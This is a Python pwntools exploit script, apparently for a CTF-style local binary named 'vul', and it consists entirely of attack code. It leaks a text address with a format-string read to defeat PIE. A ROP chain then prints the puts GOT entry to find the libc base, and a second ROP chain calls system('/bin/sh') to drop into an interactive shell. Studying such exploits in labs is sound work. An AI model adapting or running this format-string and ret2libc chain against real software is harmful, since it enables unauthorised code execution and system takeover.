from pwn import *


context(os = "linux", arch = "amd64")
vul = process("./vul")

# context.log_level = 'error'

# for i in range(1, 50):
#     io = process("./vul")
#     format_string = f'%{i}$p'
#     io.sendline(format_string) 
#     print(io.recvline(), i)

offset_base_text = 0x1080
vul.sendline(b"%37$lx")
leaked_address = vul.recvline()
leaked_address = int(str(leaked_address).split(' ')[3][:-3], 16)
actual_address = leaked_address - offset_base_text
log.success("Text section base address is leaked " + hex(leaked_address))
log.success("Actual text section address is " + hex(actual_address))


junk = b'A'*216
puts_plt = 0x1040 + actual_address
puts_got = 0x3fc0 + actual_address
pop_rdi = 0x128b + actual_address
start = 0x1080 + actual_address
ret = 0x1016 + actual_address

payload = junk + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)

vul.sendline(payload)

print(vul.recvline())

puts_actual = 0x0000000000835b0
puts_leaked = u64(vul.recvline().strip().ljust(8, b'\00'))
offset_libc = puts_leaked - puts_actual
log.success("Puts address leaked " + hex(puts_leaked))
log.success("Libc actual base address " + hex(offset_libc))

system = 0x000000000055230 + offset_libc
bin_sh = 0x1c041b + offset_libc

payload = b'mehar'
payload += b'\n'        
payload += junk + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
vul.sendline(payload)
vul.interactive()



